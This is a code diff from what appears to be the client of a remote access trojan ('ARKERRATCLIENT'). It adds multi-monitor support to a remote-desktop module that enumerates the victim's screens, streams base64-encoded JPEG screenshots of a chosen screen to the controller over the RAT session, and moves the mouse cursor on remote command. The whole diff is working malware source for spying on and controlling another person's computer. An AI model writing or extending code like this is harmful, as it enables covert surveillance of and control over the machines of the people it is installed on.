@@ -11,35 +11,74 @@ using System.Windows.Forms;
 using MouseKeyboardActivityMonitor;
 using MouseKeyboardActivityMonitor.WinApi;
 using MouseKeyboardActivityMonitor.Controls;
+using System.Linq;
+using System.Text;
 
 namespace ARKERRATCLIENT2._0
 {
     public static class RemoteDesktop
     {
         public static bool sendingFrames = false;
-        private const int ChunkSize = 32768; 
+        private const int ChunkSize = 32768;
 
-        
-           
-
-
-
-        public static async Task StartScreenStreaming(int quality)
+        public static async void SendScreens()
         {
-            while (sendingFrames && !RATClientSession.noConnection)
+            StringBuilder stringBuilder= new StringBuilder();
+            foreach (var screen in Screen.AllScreens)
             {
-                Bitmap screenshot = CaptureScreenshot(quality);
-                List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
-                await SendChunks(chunks);
-                await Task.Delay(1);
+                stringBuilder.AppendLine(screen.DeviceName+"|");
             }
+            await RATClientSession.SendData("§RemoteDesktopStart§§screen§" + stringBuilder.ToString() + "§RemoteDesktopEnd§");
         }
 
 
-        private static Bitmap CaptureScreenshot(int quality)
+
+        static Screen CurrentScreen;
+        public static async Task StartScreenStreaming(int quality, string screen)
         {
-            int desiredWidth = Screen.PrimaryScreen.Bounds.Width;
-            int desiredHeight = Screen.PrimaryScreen.Bounds.Height;
+
+            if (VideoStreamThread != null)
+            {
+                sendingFrames = false;
+                Task.WaitAny(VideoStreamThread);
+            }
+
+            sendingFrames = true;
+            foreach (var screens in Screen.AllScreens)
+            {
+                if (screens.DeviceName == screen)
+                {
+                    CurrentScreen= screens;
+                    VideoStreamThread = Task.Run(() => VideoStream(quality, CurrentScreen));
+                    return;
+                }
+            }
+
+            //No screen found
+            sendingFrames= false;
+            Task.WaitAny(VideoStreamThread);
+            await RATClientSession.SendData("§RemoteDesktopStart§§screen§" + "none" + "§RemoteDesktopEnd§");
+        }
+
+        private static Task VideoStreamThread;
+        
+
+        
+        private static async void VideoStream(int quality, Screen screen)
+        {
+            while (sendingFrames && !RATClientSession.noConnection)
+            {
+                Bitmap screenshot = CaptureScreenshot(screen,quality);
+                List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
+                await SendChunks(chunks);
+                //await Task.Delay(1);
+            }
+        }
+
+        private static Bitmap CaptureScreenshot(Screen screen, int quality)
+        {
+            int desiredWidth = screen.Bounds.Width;
+            int desiredHeight = screen.Bounds.Height;
 
             Bitmap screenshot = new Bitmap(desiredWidth, desiredHeight);
 
@@ -57,7 +96,7 @@ namespace ARKERRATCLIENT2._0
             using (MemoryStream memoryStream = new MemoryStream())
             {
                 EncoderParameters encoderParameters = new EncoderParameters(1);
-                encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, quality);
+                encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
 
                 ImageCodecInfo jpegCodec = GetEncoderInfo(ImageFormat.Jpeg);
 
@@ -111,7 +150,7 @@ namespace ARKERRATCLIENT2._0
             int x = int.Parse(cordinates[0].Split('.')[0]);
             int y = int.Parse(cordinates[1].Split('.')[0]);
 
-            Cursor.Position = new Point(x, y);
+            Cursor.Position = new Point(CurrentScreen.Bounds.Left+ x, CurrentScreen.Bounds.Top + y);
 
             if (cordinates[2] == "Left")
             {
